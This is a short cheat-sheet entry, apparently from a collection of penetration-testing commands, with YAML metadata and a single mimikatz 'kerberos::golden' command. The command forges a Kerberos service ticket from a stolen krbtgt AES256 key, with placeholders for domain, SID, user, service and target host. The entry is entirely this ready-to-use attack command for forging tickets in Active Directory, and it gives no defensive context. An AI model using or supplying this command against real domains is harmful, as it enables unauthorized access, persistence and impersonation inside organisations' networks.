---
id: 5a73cd50-780f-49b7-90ba-74790b95e5c5
name: mimikatz generate the TGS with AES 256 key
type: command
executor: bash
data: 'kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key>
  /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

  '
output: null
created_at: '2020-07-14T18:14:44.044819+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# mimikatz generate the TGS with AES 256 key

```bash
kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

```


